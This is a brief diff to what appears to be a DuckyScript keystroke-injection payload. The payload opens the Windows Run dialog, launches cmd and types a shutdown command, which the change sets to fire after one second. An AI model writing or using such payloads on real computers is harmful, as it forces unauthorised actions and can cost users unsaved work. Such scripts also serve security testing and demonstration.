@@ -3,7 +3,7 @@ GUI r
 DELAY 200
 STRING cmd
 ENTER
-DELAY 100
-STRING shutdown /s
+DELAY 500
+STRING shutdown /s /t 1	
 DELAY 100
 ENTER
